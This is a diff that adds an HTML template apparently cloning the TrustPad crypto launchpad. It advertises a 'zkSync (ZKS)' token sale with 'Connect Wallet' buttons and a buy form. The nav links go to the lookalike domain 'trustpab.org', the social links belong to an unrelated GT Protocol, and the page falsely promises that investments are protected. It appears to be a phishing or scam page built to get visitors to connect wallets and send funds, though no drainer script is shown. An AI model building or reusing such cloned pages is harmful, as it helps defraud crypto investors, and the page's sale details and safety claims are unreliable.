@@ -1,0 +1,721 @@
+<!DOCTYPE html>
+<html lang="ru">
+    @include('layout/head.html')
+    <body>
+
+        <style type="text/css">
+            .alert_absolute {
+                position: fixed!important;
+                display: flex;
+                width: 100%;
+                justify-content: center;
+                padding: 10px;
+                z-index: 1000;
+            }
+            .display-false {
+                margin-top: 0%;
+                opacity: 0;
+                transition: 0.5s ease-in-out;
+            }
+
+            .display-true {
+                margin-top: 4%;
+                opacity: 1;
+                transition: 0.7s ease-in-out;
+            }
+           </style>
+           
+        <div class="css-vechrt-SkeletonTheme">
+            <div class="font-sans antialiased">
+                <div class="bg-no-repeat bg-cover" style="background-image:url(./img/back.png)">
+                    <header>
+                        <nav class="navbar flex flex-col lg:flex-row container">
+                            <a class="text-white no-underline pr-4 flex items-center no-hover mb-3 lg:mb-0" href="https://trustpab.org/gtprotocol">
+                                <div>
+                                    <img src="https://trustpad.io/_next/static/media/tpad-logo-img.5eaa1084.svg" alt="Logo" class="mr-2 -mb-1 h-14">
+                                </div>
+                                <div>
+                                    <div class="text-xl font-secondary">TrustPad</div>
+                                    <div class="text-xs tracking-wide">The #1 Multi-Chain Launchpad.</div>
+                                </div>
+                            </a>
+                            <div class="flex flex-col lg:flex-row justify-between items-center lg:ml-auto">
+                                <div class="lg:mr-3 py-3 lg:py-0 flex items-center flex-wrap">
+                                    <a href="#pools" class="nav-link text-white">Pools 🔥</a>
+                                    <a class="nav-link text-white" href="https://trustpab.org/gtprotocol">Levels</a>
+                                    <a class="nav-link text-white" href="https://trustpab.org/gtprotocol">FAQ</a>
+                                    <a class="nav-link text-white" href="https://trustpab.org/gtprotocol">
+                                        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                                            <path d="M12 192h424c6.6 0 12 5.4 12 12v260c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V204c0-6.6 5.4-12 12-12zm436-44v-36c0-26.5-21.5-48-48-48h-48V12c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v52H160V12c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v52H48C21.5 64 0 85.5 0 112v36c0 6.6 5.4 12 12 12h424c6.6 0 12-5.4 12-12z"></path></svg></a><div class="ml-4">
+                                                <a title="Buy on PancakeSwap" href="https://pancakeswap.finance/swap?outputCurrency=0xADCFC6bf853a0a8ad7f9Ff4244140D10cf01363C" target="_blank" class="btn-sm py-2 no-hover btn btn-main">
+                                                    <img src="./img/panc.svg" alt="PancakeSwap" class="h-6 inline mr-1">
+                                                     <!-- -->Buy <!-- -->TPAD
+                                                </a>
+                                            </div>
+                                        </div>
+                                        <div class="relative py-3"><div class="ConnectButtons_container__Cj8KL">
+                                            <div class="dropdown" id="show-1">
+                                                <button
+                                                    aria-expanded="false" 
+                                                    type="button" 
+                                                    class="dropdown-toggle btn btn-main"
+                                                >Connect Wallet</button>
+                                                <div id="show-11" class="display_none">
+                                                    @include('components/drop.html')
+                                                </div>
+                                            </div>
+                                            @include('components/user.html')
+                                        </div>
+                                        <div  id="show-1_time" class="absolute right-0">
+                                            <div class="opacity-70 text-gray-300 tracking-wide" style="font-size:0.75rem">
+                                                <div id="timenow1"></div>
+                                            </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </nav>
+                    </header>
+                    <div class="z-10 jumbotron relative mb-0 bg-transparent py-12 2xl:pb-40 2xl:pt-24"><div>
+                    <div class="Jumbo_bg__dj0Ug"></div>
+                    <div class="Jumbo_bg__dj0Ug Jumbo_bg2__kd8oG"></div>
+                </div>
+                <div class="relative max-w-screen-xl mx-auto"><div>
+                <div class="flex items-stretch lg:items-start md:space-x-3 flex-col md:flex-row">
+                    <div class="md:w-2/5 xl:w-1/3 mb-3 md:mb-0 lg:sticky lg:top-3">
+                        <div class="bg-dark1 bg-opacity-90 rounded-lg shadow-2xl card bg-dark1">
+                            <div class="space-y-6 p-3 card-body">
+                                <div class="flex items-center"><div class="mr-3">
+                                    <div class="inline-block rounded-full p-1 brand-bg">
+                                        <div class="h-16 w-16 bg-darkGray rounded-full">
+                                            <img src="img/gtprotocol.jpg" alt="ZEUM" class="h-full rounded-full">
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="space-y-2"><div>
+                                <h2 class="text-2xl font-secondary tracking-wide">zkSync</h2>
+                                <div class="text-sm font-secondary text-ignored">ZKS / USD</div>
+                            </div>
+                            <div class="flex items-center space-x-2 flex-wrap">
+                                <span class="py-1 px-2 bg-opacity-40 bg-green-700 text-green-500 font-normal badge badge-pill badge-success">
+                                    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 16 16" class="inline overflow-visible" height="0.75em" width="0.75em" xmlns="http://www.w3.org/2000/svg">
+                                        <path d="M11 1a2 2 0 0 0-2 2v4a2 2 0 0 1 2 2v5a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V9a2 2 0 0 1 2-2h5V3a3 3 0 0 1 6 0v4a.5.5 0 0 1-1 0V3a2 2 0 0 0-2-2zM3 8a1 1 0 0 0-1 1v5a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V9a1 1 0 0 0-1-1H3z"></path>
+                                    </svg>
+                                    <span>Levels</span>
+                                </span>
+                                <span class="py-1 px-2 bg-opacity-40 bg-yellow-400 text-yellow-500 font-normal badge badge-pill badge-warning">Public</span>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="bg-mainDark rounded-2xl p-3 bg-opacity-50 space-y-1 mb-1">
+                        <div class="flex space-x-3 items-center justify-center">
+                            <a title="Buy on PancakeSwap" href="https://pancakeswap.finance/swap?outputCurrency=0xADCFC6bf853a0a8ad7f9Ff4244140D10cf01363C" target="_blank" class="btn-sm py-2 no-hover btn btn-main">
+                                <img src="./img//panc.svg" alt="PancakeSwap" class="h-6 inline mr-1"> Buy TPAD
+                            </a>
+                            <a title="Live Chart" href="https://www.dextools.io/" target="_blank" class="btn-sm no-hover btn btn-outline-primary">
+                                <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="inline mr-1" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M496 384H64V80c0-8.84-7.16-16-16-16H16C7.16 64 0 71.16 0 80v336c0 17.67 14.33 32 32 32h464c8.84 0 16-7.16 16-16v-32c0-8.84-7.16-16-16-16zM464 96H345.94c-21.38 0-32.09 25.85-16.97 40.97l32.4 32.4L288 242.75l-73.37-73.37c-12.5-12.5-32.76-12.5-45.25 0l-68.69 68.69c-6.25 6.25-6.25 16.38 0 22.63l22.62 22.62c6.25 6.25 16.38 6.25 22.63 0L192 237.25l73.37 73.37c12.5 12.5 32.76 12.5 45.25 0l96-96 32.4 32.4c15.12 15.12 40.97 4.41 40.97-16.97V112c.01-8.84-7.15-16-15.99-16z"></path>
+                                </svg> Live Chart
+                            </a>
+                        </div>
+                    </div>
+                    <div class="space-y-3 relative">
+                        <div class="bg-gray-500 bg-opacity-10 p-3 rounded-2xl relative">
+                            <div class="text-center">
+                                <div class="" id="trans_reg">
+                                    <div class="dropdown" id="show-2">
+                                        <button
+                                            aria-expanded="false" 
+                                            type="button" 
+                                            class="dropdown-toggle btn btn-main"
+                                        >Connect Wallet</button>
+                                        <div id="show-22" class="display_none">
+                                            @include('components/drop2.html')
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="display_none" id="trans_input">
+                                    <!-- ----------------------------------------------- -->
+                                    <!-- ----------------------------------------------- -->
+                                    <div class="input_layout">
+                                        <div class="input_conteiner">
+                                            <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
+                                                <p class="text-input-label">From</p>
+                                                <p class="text-input-label" id="select_balance_1">
+                                                 
+                                                </p>
+                                            </div>
+                                            <div style="display: flex; justify-content: center">
+                                                <input  class="input_style_1" id="input_1"> <!-- инпут 2 -->
+                                                <div class="select-conteiner">
+                                                    <img src="" id="img_1" class="input_img"/>
+                                                    <div id="select_value_1"></div>  <!-- Селект 2 -->
+                                                </div>
+                                             
+                                            </div>
+                                        </div>
+                                    </div>
+                                   <br />
+                                    <div class="input_layout">
+                                        <div class="input_conteiner">
+                                            <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
+                                                <p class="text-input-label">To</p>
+                                                <p class="text-input-label" id="select_balance_2">
+                                                
+                                                </p>
+                                            </div>
+                                            <div style="display: flex; justify-content: center">
+                                                <input  class="input_style_2" id="input_2"> <!-- инпут 2 -->
+                                                <div class="select-conteiner">
+                                                    <img src="" id="img_2" class="input_img"/>
+                                                    <div id="select_value_2"></div>  <!-- Селект 2 -->
+                                                </div>
+                                             
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div style="margin-top: 20px;">
+                                        <button
+                                            id="transaction"
+                                            aria-expanded="false" 
+                                            type="button" 
+                                            class="btn btn_color"
+                                        >
+                                        Buy 0
+                                        </button>
+                                    </div>
+                                    <!-- ----------------------------------------------- -->
+                                    <!-- ----------------------------------------------- -->
+                                </div>
+                            </div>
+                        </div>
+                        <div class="absolute right-0">
+                            <div class="text-right -mt-2 text-sm">
+                                <a href="https://docs.trustpad.io/trustpad/how-to-participate-in-an-ido#5c07" target="_blank" rel="noreferrer" class="text-gray-500 border-gray-500 border-b border-dashed no-underline hover:border-0 hover:text-gray-500">How to participate
+
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="space-y-6"><div>
+                    <div class="text-2xl brand-text" id="text_1"></div>
+                    <div class="text-lg brand-text" id="text_2"></div>
+                </div>
+                <div class="space-y-1">
+                    <div class="flex justify-between text-sm tracking-wide space-x-3">
+                        <div class="">
+                            <span>finished 9 days, 17 hours ago</span>
+                        </div>
+                        <div class="font-medium opacity-90 text-right">
+                            <span class="text-main "><span id="totalProcent">0</span><!-- -->%</span>
+                        </div>
+                    </div>
+                    <div class="h-2 bg-gray-600 flex overflow-hidden rounded" style="box-shadow:inset 0 0.1rem 0.1rem rgb(0 0 0 / 10%)">
+                        <div role="progressbar" class="bg-primary" style="width: 100%;" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100"></div>
+                    </div>
+                    <div class="flex justify-between text-sm tracking-wide space-x-3">
+                        <div class="text-ignored opacity-90 flex-shrink-0"><span id="totalUsd">0</span><!-- --> <!-- -->USD</div>
+                        <div class="text-ignored opacity-90 text-right"><span id="totalToken">0</span><!-- --> /<!-- --> <!-- -->5 000 000<!-- --> <!-- -->ZKS</div>
+                    </div>
+                </div>
+                <div class="space-y-3">
+                    <div class="flex items-center space-x-2 text-sm">
+                        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 640 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M634.91 154.88C457.74-8.99 182.19-8.93 5.09 154.88c-6.66 6.16-6.79 16.59-.35 22.98l34.24 33.97c6.14 6.1 16.02 6.23 22.4.38 145.92-133.68 371.3-133.71 517.25 0 6.38 5.85 16.26 5.71 22.4-.38l34.24-33.97c6.43-6.39 6.3-16.82-.36-22.98zM320 352c-35.35 0-64 28.65-64 64s28.65 64 64 64 64-28.65 64-64-28.65-64-64-64zm202.67-83.59c-115.26-101.93-290.21-101.82-405.34 0-6.9 6.1-7.12 16.69-.57 23.15l34.44 33.99c6 5.92 15.66 6.32 22.05.8 83.95-72.57 209.74-72.41 293.49 0 6.39 5.52 16.05 5.13 22.05-.8l34.44-33.99c6.56-6.46 6.33-17.06-.56-23.15z"></path>
+                        </svg>
+                        <span>IDO and distribution on ETH / BNB Chain</span>
+                    </div>
+                    <table class="text-sm">
+                        <tbody class="">
+                            <tr>
+                                <td class="pr-6 pb-2 pl-0">💰 Sale</td>
+                                <td class="pr-6 pb-2 pl-0">
+                                    <div><span id="date1"></span>, 12:00 – 24:00 UTC</div>
+                                </td>
+                            </tr>
+                            <tr>
+                                <td class="pr-6 pb-2 pl-0">🏃‍♂ FCFS</td>
+                                <td class="pr-6 pb-2 pl-0"><span id="date2"></span>, 23:40 UTC</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="md:w-3/5 xl:w-2/3 space-y-3">
+
+    <!-- -->
+    <div class="overflow-hidden relative bg-dark1 bg-opacity-80 rounded-lg shadow-lg border-0 z-10 card bg-dark1">
+        <div class="card-body">
+           <div class="md:p-3 z-10 space-y-8">
+              <div class="pb-3 flex flex-col gap-6">
+                 <div class="flex items-start justify-between flex-wrap">
+                    <div class="flex items-center mb-3 md:mb-0">
+                       <div class="mr-3">
+                          <div style="width:45px;height:45px"><img src="img/gtprotocol.jpg" alt="GTP" class="h-full rounded-full"></div>
+                       </div>
+                       <h2 class="text-2xl font-secondary tracking-wide mb-0">zkSync</h2>
+                    </div>
+                    <div class="space-x-3 flex items-center">
+                        <img src="./img//bnb.svg" alt="BNB Chain" class="md:h-6 h-5">
+                        <img src="img/ethereum-logo-full.1d48af6f.png" alt="Ethereum" class="md:h-7 h-5">
+                    </div>
+                 </div>
+                 <div class="opacity-80 font-light space-y-3 -mt-3">
+                    <p>zkSync is a ZK rollup, a trustless protocol that uses cryptographic validity proofs to provide scalable and low-cost transactions on Ethereum. Our mission is to accelerate the mass adoption of crypto for personal sovereignty.</p>
+                 </div>
+                 <div>
+                    <div>
+                       Your investment is protected, this sale is under the<!-- --> <a href="https://trustpad.medium.com/trustpad-introduces-safeguarded-launch-protocol-making-the-launchpad-space-safer-52c9230514e8" target="_blank" rel="noreferrer">SafeGuarded Launch Protocol</a> <!-- -->rules.
+                    </div>
+                 </div>
+                 <div class="space-x-6 flex items-center">
+                    <ul class="flex flex-wrap items-center text-main space-x-6 z-20 relative text-2xl">
+                       <li>
+                          <a href="https://t.me/global_traders_protocol_chat" target="_blank" class="text-main" rel="noreferrer">
+                             <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M446.7 98.6l-67.6 318.8c-5.1 22.5-18.4 28.1-37.3 17.5l-103-75.9-49.7 47.8c-5.5 5.5-10.1 10.1-20.7 10.1l7.4-104.9 190.9-172.5c8.3-7.4-1.8-11.5-12.9-4.1L117.8 284 16.2 252.2c-22.1-6.9-22.5-22.1 4.6-32.7L418.2 66.4c18.4-6.9 34.5 4.1 28.5 32.2z"></path>
+                             </svg>
+                          </a>
+                       </li>
+                       <li>
+                          <a href="https://t.me/Global_Traders_Protocol_Channel" target="_blank" class="text-main" rel="noreferrer">
+                             <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 576 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M576 240c0-23.63-12.95-44.04-32-55.12V32.01C544 23.26 537.02 0 512 0c-7.12 0-14.19 2.38-19.98 7.02l-85.03 68.03C364.28 109.19 310.66 128 256 128H64c-35.35 0-64 28.65-64 64v96c0 35.35 28.65 64 64 64h33.7c-1.39 10.48-2.18 21.14-2.18 32 0 39.77 9.26 77.35 25.56 110.94 5.19 10.69 16.52 17.06 28.4 17.06h74.28c26.05 0 41.69-29.84 25.9-50.56-16.4-21.52-26.15-48.36-26.15-77.44 0-11.11 1.62-21.79 4.41-32H256c54.66 0 108.28 18.81 150.98 52.95l85.03 68.03a32.023 32.023 0 0 0 19.98 7.02c24.92 0 32-22.78 32-32V295.13C563.05 284.04 576 263.63 576 240zm-96 141.42l-33.05-26.44C392.95 311.78 325.12 288 256 288v-96c69.12 0 136.95-23.78 190.95-66.98L480 98.58v282.84z"></path>
+                             </svg>
+                          </a>
+                       </li>
+                       <li>
+                          <a href="https://twitter.com/gt_protocol" target="_blank" class="text-main" rel="noreferrer">
+                             <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path>
+                             </svg>
+                          </a>
+                       </li>
+                       <li>
+                          <a href="https://gt-protocol.io/" target="_blank" class="text-main" rel="noreferrer">
+                             <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 496 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M336.5 160C322 70.7 287.8 8 248 8s-74 62.7-88.5 152h177zM152 256c0 22.2 1.2 43.5 3.3 64h185.3c2.1-20.5 3.3-41.8 3.3-64s-1.2-43.5-3.3-64H155.3c-2.1 20.5-3.3 41.8-3.3 64zm324.7-96c-28.6-67.9-86.5-120.4-158-141.6 24.4 33.8 41.2 84.7 50 141.6h108zM177.2 18.4C105.8 39.6 47.8 92.1 19.3 160h108c8.7-56.9 25.5-107.8 49.9-141.6zM487.4 192H372.7c2.1 21 3.3 42.5 3.3 64s-1.2 43-3.3 64h114.6c5.5-20.5 8.6-41.8 8.6-64s-3.1-43.5-8.5-64zM120 256c0-21.5 1.2-43 3.3-64H8.6C3.2 212.5 0 233.8 0 256s3.2 43.5 8.6 64h114.6c-2-21-3.2-42.5-3.2-64zm39.5 96c14.5 89.3 48.7 152 88.5 152s74-62.7 88.5-152h-177zm159.3 141.6c71.4-21.2 129.4-73.7 158-141.6h-108c-8.8 56.9-25.6 107.8-50 141.6zM19.3 352c28.6 67.9 86.5 120.4 158 141.6-24.4-33.8-41.2-84.7-50-141.6h-108z"></path>
+                             </svg>
+                          </a>
+                       </li>
+                    </ul>
+                 </div>
+              </div>
+              <div class="space-y-3">
+                 <h2 class="text-lg mb-2 font-secondary tracking-wider text-primary ">Pool Details</h2>
+                 <div class="flex flex-col md:flex-row flex-wrap">
+                    <div class="md:w-1/2">
+                       <li class="flex py-1 justify-between md:justify-start items-center">
+                          <div class="font-semibold mr-3">
+                             Access Type<!-- -->:
+                          </div>
+                          <div class="">Levels</div>
+                       </li>
+                    </div>
+                    <div class="md:w-1/2">
+                       <li class="flex py-1 justify-between md:justify-start items-center">
+                          <div class="font-semibold mr-3">
+                             Hard Cap<!-- -->:
+                          </div>
+                          <div class="">$500 000</div>
+                       </li>
+                    </div>
+                 </div>
+                 <ul>
+                    <li class="flex py-1 justify-between md:justify-start items-center">
+                       <div class="font-semibold mr-3">
+                          Swap Rate<!-- -->:
+                       </div>
+                       <div class="">
+                          <span class="text-main ">
+                             1 <!-- -->ZKS
+                          </span>
+                          =<!-- --> <span class="text-main ">$0.1</span> | 
+                          <span class="text-main ">
+                             1<!-- --> <!-- --> USD
+                          </span>
+                          <!-- -->per 
+                          <span class="text-main ">
+                             10 <!-- -->ZKS
+                          </span>
+                       </div>
+                    </li>
+                    <li class="flex py-1 justify-between md:justify-start items-center">
+                       <div class="font-semibold mr-3">
+                          Start<!-- -->:
+                       </div>
+                       <div class=""><span id="date3"></span>, 12:00 UTC</div>
+                    </li>
+                 </ul>
+              </div>
+              <div>
+                 <h2 class="text-lg mb-2 font-secondary tracking-wider text-primary ">Price</h2>
+                 <ul>
+                    <li class="flex py-1 justify-between md:justify-start items-center">
+                       <div class="font-semibold mr-3">
+                          IDO<!-- -->:
+                       </div>
+                       <div class="">
+                          <span class="text-main ">
+                             $<!-- -->0.1
+                          </span>
+                       </div>
+                    </li>
+                 </ul>
+              </div>
+              <div>
+                 <h2 class="text-lg mb-2 font-secondary tracking-wider text-primary ">Token</h2>
+                 <ul>
+                    <li class="flex py-1 justify-between md:justify-start items-center">
+                       <div class="font-semibold mr-3">
+                          Token<!-- -->:
+                       </div>
+                       <div class="">
+                          <span class="text-main ">
+                             zkSync<!-- --> <!-- -->(ZKS)
+                          </span>
+                       </div>
+                    </li>
+                    <li class="flex py-1 justify-between md:justify-start items-center">
+                       <div class="font-semibold mr-3">
+                          Type<!-- -->:
+                       </div>
+                       <div class="">ERC-20 | BEP-20</div>
+                    </li>
+                    <li class="flex py-1 justify-between md:justify-start items-center">
+                       <div class="font-semibold mr-3">
+                          Total Supply<!-- -->:
+                       </div>
+                       <div class="">
+                        500 000 000<!-- --> <!-- -->ZKS
+                       </div>
+                    </li>
+                    <li class="flex py-1 justify-between md:justify-start items-center">
+                       <div class="font-semibold mr-3">
+                          Initial Supply<!-- -->:
+                       </div>
+                       <div class="">
+                          <span class="text-main ">
+                             500 000 000<!-- --> <!-- -->ZKS
+                          </span>
+                          , market cap<!-- --> 
+                          <span class="text-main ">
+                             $<!-- -->500 000
+                          </span>
+                       </div>
+                    </li>
+                    <li class="flex py-1 justify-between md:justify-start items-center">
+                       <div class="font-semibold mr-3">
+                          Token Listing<!-- -->:
+                       </div>
+                       <div class="">
+                          TBD<!-- --> <span class="text-sm"></span>
+                       </div>
+                    </li>
+                 </ul>
+              </div>
+              <div>
+                 <h2 class="text-lg mb-2 font-secondary tracking-wider text-primary ">Distribution</h2>
+                 <li class="flex py-1 justify-between md:justify-start items-center">
+                    <div class="font-semibold mr-3">
+                       Distribution<!-- -->:
+                    </div>
+                    <div class=""><span>Claimed on TrustPad</span></div>
+                 </li>
+                 <li class="flex py-1 justify-between md:justify-start items-center">
+                    <div class="font-semibold mr-3">
+                       Vesting<!-- -->:
+                    </div>
+                    <div class="">10% ZKS unlock, 90% linear block-by-block unlock for 5 months</div>
+                 </li>
+                 <div class="mt-3"></div>
+              </div>
+           </div>
+        </div>
+     </div>
+     <!-- -->
+    </div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<main class="relative mx-auto"></main>
+<div class="text-center py-6 md:py-12 bg-dark2">
+    <h2 class="text-2xl md:text-4xl mb-6 font-Rubik">Want to launch your project on TrustPad?</h2>
+    <div class="inline-block">
+        <a href="https://docs.google.com/forms/d/e/1FAIpQLSer-PUjhMDG5fmasXYkmvY3EgpTC-yaI4up5by6Hx5g_9wZaw/viewform" class="btn-apply">
+        <i class="las la-space-shuttle la-2x mr-2 text-2xl"></i> Apply to Launch
+    </a>
+</div>
+</div>
+<footer class="bg-dark2 relative border-t border-gray-500 border-opacity-25">
+    <div class="flex flex-col px-4 pt-10 mx-auto container lg:px-5 pb-14 gap-20 md:gap-12">
+        <div class="flex flex-col md:flex-row justify-between gap-12 text-sm font-normal">
+            <div class="flex flex-col xl:flex-row gap-6">
+                <a class="text-white mr-auto no-underline pr-4 flex items-center no-hover" href="https://trustpab.org/gtprotocol">
+                    <div>
+                        <img src="https://trustpad.io/_next/static/media/tpad-logo-img.5eaa1084.svg" alt="Logo" class="mr-2 -mb-1 h-14">
+                    </div>
+                    <div>
+                        <div class="text-xl font-secondary">TrustPad</div>
+                        <div class="text-xs tracking-wide">Making DeFi a Safer Place.</div>
+                    </div>
+                </a>
+                <p class="text-secondary text-sm flex-1">TrustPad is a decentralized multi-chain fundraising platform enabling projects to raise capital and promise safety to early stage investors. Stake TrustPad tokens to get priority-access to promising projects.</p>
+            </div>
+            <div>
+                <ul class="flex items-center space-x-8">
+                    <li><a href="https://t.me/TrustPadAnn" target="_blank" class="text-main" rel="noreferrer">
+                        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 576 512" height="2em" width="2em" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M576 240c0-23.63-12.95-44.04-32-55.12V32.01C544 23.26 537.02 0 512 0c-7.12 0-14.19 2.38-19.98 7.02l-85.03 68.03C364.28 109.19 310.66 128 256 128H64c-35.35 0-64 28.65-64 64v96c0 35.35 28.65 64 64 64h33.7c-1.39 10.48-2.18 21.14-2.18 32 0 39.77 9.26 77.35 25.56 110.94 5.19 10.69 16.52 17.06 28.4 17.06h74.28c26.05 0 41.69-29.84 25.9-50.56-16.4-21.52-26.15-48.36-26.15-77.44 0-11.11 1.62-21.79 4.41-32H256c54.66 0 108.28 18.81 150.98 52.95l85.03 68.03a32.023 32.023 0 0 0 19.98 7.02c24.92 0 32-22.78 32-32V295.13C563.05 284.04 576 263.63 576 240zm-96 141.42l-33.05-26.44C392.95 311.78 325.12 288 256 288v-96c69.12 0 136.95-23.78 190.95-66.98L480 98.58v282.84z"></path>
+                        </svg>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://t.me/TrustPad" target="_blank" class="text-main" rel="noreferrer">
+                        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" height="2em" width="2em" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M446.7 98.6l-67.6 318.8c-5.1 22.5-18.4 28.1-37.3 17.5l-103-75.9-49.7 47.8c-5.5 5.5-10.1 10.1-20.7 10.1l7.4-104.9 190.9-172.5c8.3-7.4-1.8-11.5-12.9-4.1L117.8 284 16.2 252.2c-22.1-6.9-22.5-22.1 4.6-32.7L418.2 66.4c18.4-6.9 34.5 4.1 28.5 32.2z"></path>
+                        </svg>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://trustpad.medium.com/" target="_blank" class="text-main" rel="noreferrer">
+                        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" height="2em" width="2em" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M0 32v448h448V32H0zm372.2 106.1l-24 23c-2.1 1.6-3.1 4.2-2.7 6.7v169.3c-.4 2.6.6 5.2 2.7 6.7l23.5 23v5.1h-118V367l24.3-23.6c2.4-2.4 2.4-3.1 2.4-6.7V199.8l-67.6 171.6h-9.1L125 199.8v115c-.7 4.8 1 9.7 4.4 13.2l31.6 38.3v5.1H71.2v-5.1l31.6-38.3c3.4-3.5 4.9-8.4 4.1-13.2v-133c.4-3.7-1-7.3-3.8-9.8L75 138.1V133h87.3l67.4 148L289 133.1h83.2v5z"></path>
+                        </svg>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://twitter.com/TrustPad" target="_blank" class="text-main" rel="noreferrer">
+                        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="2em" width="2em" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path>
+                        </svg>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://bscscan.com/address/0xADCFC6bf853a0a8ad7f9Ff4244140D10cf01363C" target="_blank" class="text-main" rel="noreferrer" title="TrustPad on BscScan">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 121.378 121.333" class="h-6 w-6">
+                            <g id="bscscan-logo-light-circle" transform="translate(-219.378 -213.334)">
+                                <path d="M244.6,271.1a5.144,5.144,0,0,1,5.168-5.143l8.568.028a5.151,5.151,0,0,1,5.151,5.151v32.4c.965-.286,2.2-.591,3.559-.911a4.292,4.292,0,0,0,3.309-4.177V258.261a5.152,5.152,0,0,1,5.151-5.152H284.1a5.152,5.152,0,0,1,5.151,5.152v37.3s2.15-.87,4.243-1.754a4.3,4.3,0,0,0,2.625-3.957V245.383a5.151,5.151,0,0,1,5.15-5.151h8.585A5.151,5.151,0,0,1,315,245.383V282c7.443-5.394,14.986-11.882,20.972-19.683a8.646,8.646,0,0,0,1.316-8.072,60.636,60.636,0,1,0-109.855,50.108,7.668,7.668,0,0,0,7.316,3.79c1.624-.143,3.646-.345,6.05-.627a4.29,4.29,0,0,0,3.805-4.258V271.1" fill="#fff"></path>
+                                <path d="M244.417,323.061A60.656,60.656,0,0,0,340.756,274c0-1.4-.065-2.778-.158-4.152-22.163,33.055-63.085,48.508-96.181,53.213" fill="#f0b90b"></path>
+                            </g>
+                        </svg>
+                    </a>
+                </li>
+            </ul>
+        </div>
+    </div>
+    <div class="flex flex-wrap md:justify-between w-full gap-12">
+        <div class="text-sm">
+            <p class="mb-4 text-lg text-secondary">General</p>
+            <ul>
+                <li class="mb-4 last:mb-0">
+                    <a href="https://trustpab.org/gtprotocol" target="_blank" rel="noopener noreferrer nofollow" class="no-underline text-white hover:text-main active:text-mainDark focus:text-main">Levels Staking</a>
+                </li>
+                <li class="mb-4 last:mb-0">
+                    <a href="https://trustpab.org/gtprotocol" target="_blank" rel="noopener noreferrer nofollow" class="no-underline text-white hover:text-main active:text-mainDark focus:text-main">Farm</a>
+                </li>
+                <li class="mb-4 last:mb-0">
